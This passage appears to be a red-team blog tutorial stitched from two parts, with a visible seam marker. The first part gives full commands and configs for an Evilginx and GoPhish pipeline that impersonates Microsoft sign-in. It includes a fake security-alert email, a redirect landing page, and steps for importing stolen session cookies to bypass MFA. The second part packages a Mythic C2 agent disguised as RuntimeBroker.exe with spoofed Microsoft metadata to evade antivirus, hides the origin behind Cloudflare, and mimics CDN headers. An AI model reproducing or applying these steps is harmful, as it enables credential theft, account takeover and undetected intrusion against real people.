The challenge with Evilginx specifically is that it needs to proxy multiple subdomains simultaneously. For example, the Microsoft phishlet creates entries for login.domain.name, cdn.domain.name, account.domain.name, and several others. A standard HTTP reverse proxy like nginx can’t handle this because Evilginx needs to perform its own TLS termination per subdomain.

The solution is to use nginx’s stream module with ssl_preread. Instead of terminating TLS itself for Evilginx traffic, nginx reads the SNI (Server Name Indication) field from the TLS handshake without decrypting it, and forwards the raw TCP stream to the appropriate backend based on the hostname.

This means:

  • nginx owns port 443
  • Traffic to login.domain.name -> forwarded as raw TCP to Evilginx on port 8880
  • Traffic to track.domain.name -> nginx terminates TLS and proxies HTTP to GoPhish on port 8080

First, verify the stream SSL preread module is available:

nginx -V 2>&1 | grep stream_ssl_preread

Edit /etc/nginx/nginx.conf and add the stream block at the very bottom, outside the http {} block:

stream {
    map $ssl_preread_server_name $backend {
        login.domain.name  127.0.0.1:8880;
        default            127.0.0.1:8443;
    }

    server {
        listen 443;
        proxy_pass $backend;
        ssl_preread on;
    }
}

Then create the GoPhish site config at /etc/nginx/sites-available/gophish:

# GoPhish : track.domain.name
server {
    listen 80;
    server_name track.domain.name;
    return 301 https://$host$request_uri;
}
server {
    listen 8443 ssl;
    server_name track.domain.name;
    ssl_certificate /etc/letsencrypt/live/domain.name/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/domain.name/privkey.pem;
    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}

Enable the config and reload:

sudo ln -s /etc/nginx/sites-available/gophish /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx

Configuring Evilginx

Evilginx 3.x stores its configuration in ~/.evilginx/config.json (when run as root, this is /root/.evilginx/config.json). Edit it to set the domain, external IP, and HTTPS port.

{
  "general": {
    "autocert": true,
    "bind_ipv4": "",
    "dns_port": 53,
    "domain": "domain.name",
    "external_ipv4": "11.10.09.08",
    "https_port": 8880,
    "unauth_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
  }
}

A few things to note here:

  • https_port: 8880 : Evilginx listens on this non-standard port, since nginx owns 443
  • autocert: true : Evilginx will use Let’s Encrypt to issue its own certificates for each phishlet subdomain
  • unauth_url : where unauthorized visitors (bots, scanners) get redirected. Using a benign URL here is good OPSEC

For autocert to work, Evilginx needs to issue certificates for every subdomain the phishlet creates. For the Microsoft phishlet, this means issuing certs for login.domain.name, cdn.domain.name, account.domain.name, etc. All of these need to have DNS A records pointing to your VM.

Add the following records in Cloudflare for the Microsoft phishlet (all DNS only, grey cloud):

Name Value
cdn 11.10.09.08
account 11.10.09.08
storage 11.10.09.08
outlook 11.10.09.08
microsoft 11.10.09.08
ssl 11.10.09.08
academy 11.10.09.08

I took the liberty to modify the phishlet’s YAML file to fit my needs.

Running Evilginx

Since Evilginx 3.x is an interactive CLI tool rather than a traditional daemon, we run it in a terminal session. Start it with:

sudo /opt/evilginx/evilginx -p /opt/evilginx/phishlets -c /root/.evilginx

Inside the Evilginx console, configure the domain and IP:

config domain domain.name
config ipv4 external 11.10.09.08

Enable the Microsoft phishlet and verify configuration:

phishlets hostname microsoft domain.name
phishlets enable microsoft
phishlets

Trigger certificate issuance:

test-certs

Once certs are issued, create a lure URL:

lures create microsoft
lures get-url 0

This returns a URL like https://login.domain.name/xxxxxxxx. This is what we’ll embed in our phishing emails.

Testing Evilginx

Open the lure URL in a browser. You should see the real Microsoft login page served through your proxy, with a valid TLS certificate issued for login.domain.name.

After a test login attempt, check the Evilginx console:

sessions
sessions 0

You’ll see the captured credentials and session cookies. The cookies can be imported directly into a browser using a cookie editor extension, giving you an authenticated session that bypasses MFA entirely.

GoPhish

What Is GoPhish?

GoPhish is an open-source phishing framework designed for red teams and security professionals. It provides a web-based admin interface where you can:

  • Create email templates with tracking pixels and custom links
  • Define sending profiles (SMTP relay configuration)
  • Build target groups from CSV or manual entry
  • Launch campaigns and track results in real time: opens, clicks, submitted credentials

In our setup, GoPhish handles the delivery side. It sends emails through our Postfix relay, tracks who clicks the link, and redirects targets to the Evilginx lure URL where credential harvesting happens.

Installation

Download the latest GoPhish release:

cd /opt
sudo wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
sudo unzip gophish-v0.12.1-linux-64bit.zip -d gophish
cd gophish
sudo chmod +x gophish

Configuration

Edit the GoPhish config file:

sudo nano /opt/gophish/config.json

{
  "admin_server": {
    "listen_url": "127.0.0.1:3333",
    "use_tls": true,
    "cert_path": "/etc/letsencrypt/live/domain.name/fullchain.pem",
    "key_path": "/etc/letsencrypt/live/domain.name/privkey.pem"
  },
  "phish_server": {
    "listen_url": "127.0.0.1:8080",
    "use_tls": false,
    "cert_path": "",
    "key_path": ""
  },
  "db_name": "sqlite3",
  "db_path": "gophish.db",
  "migrations_prefix": "db/db_",
  "contact_address": "",
  "logging": {
    "filename": "",
    "level": ""
  }
}

Key points:

  • The admin server binds to 127.0.0.1 only : it’s never directly exposed to the internet. We access it via SSH tunnel.
  • The phish server binds to 127.0.0.1:8080 : nginx receives traffic on 8443 and proxies it here.
  • TLS is handled by the wildcard cert we already have.

Running GoPhish

cd /opt/gophish
sudo ./gophish

On first launch, GoPhish prints a temporary admin password:

time="..." level=info msg="Please login with the username admin and the password a18a300c56d5e339"
time="..." level=info msg="Starting phishing server at http://127.0.0.1:8080"
time="..." level=info msg="Starting admin server at https://127.0.0.1:3333"

Save that password somewhere safe. You’ll be prompted to change it on first login.

Accessing the Admin Interface

Since the admin interface binds to localhost only, access it via SSH port forwarding. On your local machine:

ssh -L 3333:127.0.0.1:3333 user@11.10.09.08

Then open https://127.0.0.1:3333 in your browser. Accept the TLS warning (the cert is valid for domain.name, not 127.0.0.1) and log in.

Change the password when prompted, then you’ll land on the GoPhish dashboard.

Sending Profile

The sending profile tells GoPhish how to deliver emails. Since we have Postfix running locally and configured to relay through Resend, we just point GoPhish at the local Postfix instance.

Go to Sending Profiles → New Profile and fill in:

Field Value
Name Postfix Relay
From IT Support <noreply@domain.name>
Host 127.0.0.1:25
Username (leave empty)
Password (leave empty)

No authentication is needed here because Postfix is configured to accept unauthenticated connections from localhost (mynetworks = 127.0.0.0/8). Postfix then handles the authenticated relay to Resend internally.

Click Send Test Email and verify delivery before saving.

Email Template

Go to Email Templates → New Template.

Give it a convincing subject line and write the body. The key thing here is to use {{.URL}} as the link placeholder. GoPhish replaces this automatically with a unique per-recipient tracking URL that eventually redirects to Evilginx.

You can also use {{.FirstName}} to personalize the email with the target’s first name from your target group.

Here’s a simple template body, DO NOT USE THIS TEMPLATE, IT’LL BE FLAGGED IMMEDIATELY:

<html>
<head>
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
</head>
<body style="font-family: Arial, sans-serif; padding: 20px;">
<h1 style="color:#4472c4">Microsoft Account</h1>
<p>Dear {{.FirstName}},</p>
<p>We detected multiple sign-in attempts to your account from Bogotá, Colombia. 
If this was not you, please verify your identity immediately.</p>
<p>
  <a href="{{.URL}}" style="background-color:#4472c4; color:white; padding:10px 20px; 
  text-decoration:none; border-radius:4px;">Review Recent Activity</a>
</p>
<p>If you initiated this activity you may safely ignore this message.</p>
<br>
<p>Sincerely,</p>
<p>Microsoft Account Team</p>
</body>
</html>

Make sure to use the Source (HTML) editor when pasting this, the text editor will escape the HTML tags.

Landing Page

Go to Landing Pages -> New Page.

The landing page in our setup is minimal, it exists only to redirect visitors to Evilginx. GoPhish uses it to track the click event before forwarding the target onwards.

Switch to the HTML source editor and paste:

<html>
<head>
<meta http-equiv="refresh" content="0; url=https://login.domain.name/xxxxxxxx">
</head>
<body></body>
</html>

Replace xxxxxxxx with your actual Evilginx lure path.

Also set the Redirect URL field to https://login.domain.name/xxxxxxxx and enable Capture Submitted Data for completeness.

Important: make sure to use the HTML source editor when pasting the redirect tag. If you paste it in the text editor, it will be treated as plain text and rendered literally instead of executing the redirect.

Users & Groups

Go to Users & Groups -> New Group.

Add your target list. At minimum, each entry needs a first name and email address. You can import from a CSV file for larger engagements:

First Name,Last Name,Email,Position
John,Doe,john.doe@target.com,IT Manager
Jane,Smith,jane.smith@target.com,Finance Director

Launching a Campaign

Go to Campaigns -> New Campaign and fill in all fields:

Field Value
Name MS Security Alert - Q2
Email Template your template
Landing Page Evilginx Redirect
URL https://track.domain.name
Sending Profile Postfix Relay
Groups your target group

The URL field is the base URL of GoPhish’s phishing listener, it’s what GoPhish uses to build per-recipient tracking links. When a target clicks the link in the email, they hit track.domain.name, GoPhish logs the click, then redirects them to your Evilginx lure URL.

Click Launch Campaign.

Monitoring Results

The campaign dashboard shows real-time statistics as targets interact with the email:

  • Email Sent : delivery confirmed
  • Email Opened : tracking pixel loaded
  • Clicked Link : target clicked the CTA button
  • Submitted Data : credentials entered on the landing page (captured by GoPhish)

Simultaneously, check the Evilginx console for session captures:

sessions

Once a session appears with tokens captured, you can view the full details:

sessions 0

This shows the captured cookies in JSON format. Copy the cookie values and import them into your browser using a cookie editor extension (EditThisCookie or Cookie-Editor work well). Navigate to portal.office.com or outlook.com, you’ll be authenticated as the target, MFA bypassed.

The Full Kill Chain

Here’s the complete flow as it plays out during an engagement:

Each component plays a distinct role, and the entire chain is observable and controllable from a single VM. GoPhish gives you campaign analytics, Evilginx gives you the credentials and tokens, and Mythic gives you persistent access post-exploitation.

OPSEC Considerations

A few things worth keeping in mind when operating this infrastructure:

Domain aging : freshly registered domains have poor reputation. Where possible, register your domain at least 30 days before an engagement and set up the DNS records early to build some history.

Email headers : GoPhish adds an X-Mailer: gophish header by default. Patch the binary or modify the source to remove this obvious indicator.

Lure URL length : Evilginx generates short random paths by default. Consider customizing them to look more like legitimate reset or verification URLs (e.g. /identity/verify?token=...).

Unauth redirect : configure Evilginx’s unauth_url to redirect unknown visitors (bots, scanners, blue teamers) to a benign site. The YouTube rickroll default is fine for labs, but use something more plausible for real engagements.

Certificate transparency : every Let’s Encrypt certificate is logged publicly in CT logs. If a blue team is monitoring CT logs for your domain, they’ll see your phishlet subdomains. Consider using a different CA or purchasing a wildcard certificate through a registrar.

Callback domain : ideally your Mythic C2 and your phishing infrastructure use entirely separate domains and VMs. Correlation between the two can expose your full infrastructure if either gets flagged.

item.content:
This is the continuation of this article

Advanced Detection Systems are a real headache for red teamers (as they should be). Modern environments aren’t just relying on static AV anymore, you’re dealing with layered detection: AV, EDR, SIEM correlation, sometimes even behavioral ML on top.

So instead of trying to “bypass everything” (which is unrealistic), the idea here is to reduce your footprint at each layer.

In this part, I focused on a few steps that already make a big difference in a real-world engagement. But before going into infra and traffic shaping, the first obvious checkpoint is: does the payload even survive basic AV?

Now that I made my own agent for Mythic, the goal is to make it less obvious to monitoring solutions, both at rest and in transit.

Bypassing AVs

Before doing anything fancy, I checked my payload against VirusTotal. No surprises here; it got picked up by a couple of engines:

At this stage, this is mostly signature + heuristic detection. Even a custom agent can still trigger flags depending on how it’s packaged.

I tried a couple of approaches, starting with PyInstaller, but I found that Nuitka gave noticeably better results:

The reasoning here is pretty straightforward:

  • PyInstaller bundles Python bytecode -> easier to fingerprint
  • Nuitka compiles to C -> then to machine code -> significantly less “Python-looking” artifacts

That alone reduces the number of trivial detections.

Here’s the command I used to generate a Windows executable:

python -m nuitka \
  --standalone \
  --onefile \
  --windows-console-mode=disable \
  --python-flag=no_site \
  --python-flag=no_warnings \
  --python-flag=isolated \
  --nofollow-import-to=tkinter \
  --nofollow-import-to=unittest \
  --enable-plugin=anti-bloat \
  --windows-company-name="Microsoft Corporation" \
  --windows-product-name="Windows Host Process" \
  --windows-file-version=10.0.19041.1 \
  --windows-product-version=10.0.19041.1 \
  --windows-file-description="Windows Host Process (Rundll32)" \
  --output-filename=RuntimeBroker.exe \
  agent.py

A couple of important details here:

  • Metadata spoofing (company name, product name, etc.) helps blend into legitimate binaries
  • Anti-bloat plugin reduces unnecessary imports -> smaller surface for static analysis
  • Isolated Python flags remove environmental dependencies that can leak indicators

Writing your own agent already helps with AV evasion since there are no public signatures tied to it. That said, Mythic’s base implementations are still relatively well-known, so don’t assume you’re safe just because it’s “custom”.

Azure Setup

I won’t go too deep into Azure provisioning. This isn’t a cloud tutorial, just enough to get a realistic infra in place.

We need a VM to host the C2 server. Minimum specs:

  • 2 CPUs
  • 4 GB RAM

I went with Ubuntu, 2 CPUs and 8 GB RAM just to keep things smooth during deployment and testing:

No need for extra disk space, default boot disk is enough.

For networking, open:

  • SSH (management)
  • HTTP / HTTPS (C2 traffic)
  • Mythic UI (optional)

I restricted the Mythic UI to my own IP. This reduces exposure significantly, but only makes sense if your IP is relatively stable, otherwise it becomes annoying quickly.

Then you can just follow the install steps from this article.

CDN Setup

This is where things start getting interesting from an evasion standpoint.

The goal here is simple: don’t expose your origin server directly.

Before using a CDN, a simple DNS lookup returns your actual Azure IP:

That’s bad, defenders can:

  • pivot directly to your infra
  • scan your server
  • correlate infrastructure across engagements

So we put a CDN in front.

First, you’ll need a domain. I just bought a cheap one (~$1). Free subdomains can work, but I ran into issues integrating them cleanly with Cloudflare.

After onboarding your domain in Cloudflare:

  • Enable automatic DNS import
  • Replace your registrar’s nameservers with Cloudflare’s

Then… wait. DNS propagation can take awhile.

Once everything is set, querying your domain now returns Cloudflare IPs instead of your VM:

This gives you:

  • Origin IP masking
  • Basic traffic normalization
  • A layer between you and direct attribution

Not bulletproof, but way better than exposing your VM raw.

HTTP Profile Setup

Now we move to traffic legitimacy.

Using plain HTTP in 2026 is basically asking to get flagged. So we switch to HTTPS with valid certificates.

First, generate certs using certbot:

sudo apt-get install -y certbot
sudo certbot certonly --register-unsafely-without-email \
  -d your.domain

Then copy them into the Mythic HTTP profile:

sudo cp /etc/letsencrypt/live/YOURDOMAIN/fullchain.pem .
sudo cp /etc/letsencrypt/live/YOURDOMAIN/privkey.pem .

# Copy certs into HTTP C2 container
sudo docker ps | grep http
sudo docker cp fullchain.pem CONTAINER_ID:/Mythic/http/c2_code/fullchain.pem
sudo docker cp privkey.pem CONTAINER_ID:/Mythic/http/c2_code/privkey.pem

Update the HTTP profile config:

{
    "instances": [
        {
            "port": 443,
            "key_path": "privkey.pem",
            "cert_path": "fullchain.pem",
            "debug": true,
            "use_ssl": true,
            "ServerHeaders": {
                "Cache-Control": "max-age=0, no-cache",
                "Connection": "keep-alive",
                "Content-Type": "application/javascript; charset=utf-8",
                "Pragma": "no-cache",
                "Server": "NetDNA-cache/2.2"
            },
            "error_file_path": "",
            "error_status_code": 404,
            "payloads": {}
        }
    ]
}

Important points:

  • Port 443 -> blends with normal HTTPS traffic
  • Valid TLS cert -> avoids TLS inspection flags
  • Custom headers -> helps mimic legitimate CDN/web traffic

When generating payloads:

  • Use your domain, not the IP
  • Use https://, not http://

Otherwise, the CDN + TLS setup becomes useless.

Closing Thoughts

This part is mostly about infrastructure-level evasion:

  • Reducing AV detections (payload side)
  • Hiding origin infrastructure (CDN)
  • Making traffic look legitimate (HTTPS + headers)

It’s far from enough on its own.

Detection today is heavily behavioral, so even with clean infra, bad tradecraft will still get you caught.

Next parts will go deeper into:

  • traffic shaping
  • beacon design
  • and ways to reduce behavioral indicators
